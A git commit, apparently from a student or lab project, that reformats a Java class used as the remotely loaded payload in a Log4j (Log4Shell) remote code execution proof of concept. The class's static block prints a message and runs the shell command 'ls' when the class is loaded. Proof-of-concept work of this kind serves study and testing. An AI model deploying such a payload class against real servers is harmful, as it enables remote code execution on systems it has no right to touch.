4572bb1da7c9fd99210533592bdd23393edea800
1004-head <woduf0628@naver.com>
2022-01-27 21:13:13 +0900

    공격클래스매핑

--- attack/src/main/java/keeper/log4j/attack/attack/AttackClass.java
+++ attack/src/main/java/keeper/log4j/attack/attack/AttackClass.java
@@ -2,17 +2,13 @@ package keeper.log4j.attack.attack;
 
 public class AttackClass {
 
-    static {
-        System.out.println("I am Log4jRCE from remote!!!");
-        try {
-           String[] cmd = {"ls"};
-            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+  static {
+    System.out.println("I am Log4jRCE from remote!!!");
+    try {
+      String[] cmd = {"ls"};
+      java.lang.Runtime.getRuntime().exec(cmd).waitFor();
+    } catch (Exception e) {
+      e.printStackTrace();
     }
-
-    public AttackClass(){
-        System.out.println("I am Log4jRCE from remote222!!!");
-    }
+  }
 }
